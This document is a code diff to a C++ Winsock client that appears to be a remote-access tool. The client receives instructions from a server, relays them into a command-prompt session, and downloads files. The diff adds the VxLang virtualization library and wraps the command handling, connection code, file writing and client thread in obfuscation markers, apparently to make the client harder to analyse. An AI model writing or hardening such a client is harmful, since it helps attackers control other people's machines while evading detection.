@@ -1,6 +1,14 @@
 #include "client.h"
 #include <process.h>
 
+#include "vxlang/vxlib.h"
+
+#ifndef _WIN64
+#pragma comment(lib, "vxlib32.lib")
+#else
+#pragma comment(lib, "vxlib64.lib")
+#endif
+
 // a lot of the networking structure was adapted from Pindrought's very
 // comprehensive Winsock Networking Tutorials (
 // http://www.planetchili.net/forum/viewtopic.php?f=3&t=3433 )
@@ -12,23 +20,33 @@ bool Client::ProcessPacketType(PacketType _PacketType) {
   switch (_PacketType) {
   case PacketType::Instruction: {
     std::string msg;
-    if (!GetString(msg))
+    if (!GetString(msg)) {
       return false;
+    }
+    VL_VIRTUALIZATION_BEGIN;
     SendString(General::processCommand(msg), PacketType::Instruction);
+    VL_VIRTUALIZATION_END;
     break;
   }
 
   case PacketType::CMDCommand: {
+    // VL_VIRTUALIZATION_BEGIN; CRASH
     std::string msg;
     if (!GetString(msg))
       return false;
+
     if (CMD::cmdptr != NULL) {
+      VL_VIRTUALIZATION_BEGIN;
       CMD::cmdptr->writeCMD(msg); // MOST ANNOYING BUG: [FIXED]
+      VL_VIRTUALIZATION_END;
       break;
     } else {
+      // VL_VIRTUALIZATION_BEGIN; NOT WORKING PROPERLY
       SendString("Initiate a CMD session first.", PacketType::Warning);
+      // VL_VIRTUALIZATION_END; NOT WORKING PROPERLY
       break;
     }
+    // VL_VIRTUALIZATION_END; CRASH
   }
 
   case PacketType::FileTransferByteBuffer: {
@@ -40,6 +58,7 @@ bool Client::ProcessPacketType(PacketType _PacketType) {
     {
       return false;
     }
+    VL_VIRTUALIZATION_BEGIN;
     file.outfileStream.write(
         file.buffer,
         buffersize); // write buffer from file.buffer to our outfilestream
@@ -47,6 +66,7 @@ bool Client::ProcessPacketType(PacketType _PacketType) {
         buffersize; // increment byteswritten
                     // std::cout << "Received byte buffer for file transfer of
                     // size: " << buffersize << std::endl;
+    VL_VIRTUALIZATION_END;
     if (!SendPacketType(
             PacketType::FileTransferRequestNextBuffer)) // send PacketType type
                                                         // to request next byte
@@ -68,10 +88,13 @@ bool Client::ProcessPacketType(PacketType _PacketType) {
            // << std::endl; //Display that PacketType was not found
     break;
   }
+
   return true;
 }
 
 void Client::ClientThread() {
+
+  VL_VIRTUALIZATION_BEGIN;
   PacketType PacketType;
   while (true) {
     if (!clientptr->GetPacketType(PacketType)) // Get PacketType type
@@ -80,6 +103,7 @@ void Client::ClientThread() {
             PacketType)) // Process PacketType (PacketType type)
       break; // If there is an issue processing the PacketType, exit this loop
   }
+  VL_VIRTUALIZATION_END;
   connected = false;
   // std::cout << "Lost connection to the server." << std::endl;
   if (clientptr->CloseConnection()) // Try to close socket connection..., If
@@ -121,11 +145,13 @@ bool Client::resolveIP(std::string &hostname) {
 }
 
 bool Client::RequestFile(std::string FileName) {
+  VL_VIRTUALIZATION_BEGIN;
   file.outfileStream.open(FileName,
                           std::ios::binary); // open file to write file to
   file.fileName = FileName;                  // save file name
   file.bytesWritten =
       0; // reset byteswritten to 0 since we are working with a new file
+  VL_VIRTUALIZATION_END;
   if (!file.outfileStream.is_open()) // if file failed to open...
   {
     // std::cout << "ERROR: Function(Client::RequestFile) - Unable to open file:
@@ -133,9 +159,12 @@ bool Client::RequestFile(std::string FileName) {
     return false;
   }
   // std::cout << "Requesting file from server: " << FileName << std::endl;
-  if (!SendString(FileName,
-                  PacketType::FileTransferRequestFile)) // send file name
+  VL_VIRTUALIZATION_BEGIN;
+  if (!SendString(FileName, PacketType::FileTransferRequestFile)) {
+    VL_VIRTUALIZATION_END;
     return false;
+  } // send file name
+
   return true;
 }
 
@@ -156,6 +185,7 @@ Client::Client(std::string IP, int PORT) {
 }
 
 bool Client::Connect() {
+  VL_VIRTUALIZATION_BEGIN;
   Connection = socket(AF_INET, SOCK_STREAM, NULL); // Set Connection socket
   if (connect(Connection, (SOCKADDR *)&addr, sizeof(addr)) !=
       0) // If we are unable to connect...
@@ -168,6 +198,7 @@ bool Client::Connect() {
                  NULL); // Create the client thread that will receive any data
                         // that the server sends.
   connected = true;
+  VL_VIRTUALIZATION_END;
   return true;
 }
 
@@ -177,7 +208,7 @@ bool Client::CloseConnection() {
         WSAENOTSOCK) // If socket error is that operation is not performed on a
                      // socket (This happens when the socket has already been
                      // closed)
-      return true; // return true since connection has already been closed
+      return true;   // return true since connection has already been closed
 
     std::string ErrorMessage = "Failed to close the socket. Winsock Error: " +
                                std::to_string(WSAGetLastError()) + ".";
